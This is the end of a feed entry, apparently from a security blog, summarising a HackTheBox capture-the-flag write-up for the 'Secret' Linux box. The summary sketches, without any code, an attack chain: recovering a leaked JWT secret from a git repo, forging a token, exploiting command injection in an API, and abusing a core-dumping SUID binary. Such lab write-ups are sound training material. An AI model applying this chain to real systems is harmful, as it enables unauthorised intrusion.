+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="api" /><category term="nodejs" /><category term="static analysis" /><category term="git" /><category term="jwt" /><category term="command injection" /><category term="information disclosure" /><category term="tunneling" /><category term="apport" /><category term="custom exploitation" /><summary type="html"><![CDATA[Secret is an easy linux box where you have to exploit a sensitive information leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to command injection. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.]]></summary></entry></feed>
